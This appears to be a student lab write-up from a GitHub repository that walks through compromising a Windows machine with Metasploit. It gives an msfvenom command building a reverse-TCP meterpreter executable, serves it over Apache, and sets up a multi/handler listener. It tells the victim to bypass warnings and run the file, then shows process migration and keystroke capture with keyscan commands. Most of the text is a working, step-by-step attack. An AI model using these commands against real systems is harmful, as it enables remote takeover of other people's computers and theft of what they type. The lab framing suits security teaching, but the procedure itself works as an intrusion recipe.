# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands
PROGRAM:
Find the attackers ip address using ifconfig

OUTPUT:
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/7f7c931d-3c53-4586-99f7-9bcf5f432b59)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

OUTPUT
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/48dc0f08-070b-44d8-b533-ac746a15f7cd)
copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/ec7d9753-2aec-4bca-9ac6-810bd2f2a0c6)
Start apache server sudo systemctl apache2 start
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/e7e31b0f-5d4b-4100-9d6b-b79e4ac75cab)
Check the status of apache2
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/00f16221-cf2e-454b-ab4f-f9c920d47b2d)
Invoke msfconsole:






## EXECUTION STEPS AND ITS OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/ecd6c668-eb5c-45ef-a023-6c9297de75a1)
set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/a6da233a-d97b-4188-896e-1a388cd6ee72)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/ac5a25a3-ac3e-4ac0-a0b7-57174b10a9bf)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/48624dc9-40be-42bd-ad0e-b1bd5fbc606b)
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/4eef97bc-481c-46b1-ac84-c3a45364c430)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name. 
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/6e140875-9580-4abe-88f2-06b15441246d)
keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/132996838/a87ef660-5151-4141-82d1-0134407f7366)










## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
